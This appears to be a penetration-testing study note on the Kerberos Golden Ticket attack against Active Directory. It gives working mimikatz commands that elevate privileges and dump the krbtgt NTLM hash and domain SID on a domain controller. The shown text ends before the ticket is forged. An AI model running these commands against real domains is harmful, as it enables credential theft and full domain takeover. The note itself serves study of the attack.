
## **Overview**

- [ ] **What is it ?**
	- When we compromise the krbtgt account, we own the domain
	- We can request access to any resource or system on the domain
	- Golden tickets == Complete access to every machine

- [ ] We can utilize `mimikatz` to obtain the information necessary to perform this attack
- [ ] There are a couple of conditions need to be met 
	- We need the krbtgt NTLM hash
	- We also need the domain SID 
- [ ] Once we have this we can generate our golden ticket and once it is generated we can use an attack call **Pass-the-Ticket** in other to utilize this anywhere

## **Attack Scenario**

First of all make sure you transfer `mimikatz` to your domain controller then we can start it through the **Command Prompt**

```powershell
# start mimikatz
C:\Users\Administrator\Downloads>mimikatz.exe

# Elevate to highest integrity level
mimikatz # privilege::debug
mimikatz # token::elevate
```


### Dumping the SID and NTLM hash

```powershell
# Dump the sid and NTLM hash of the krbtgt user
mimikatz # lsadump::lsa /inject /name:krbtgt
```


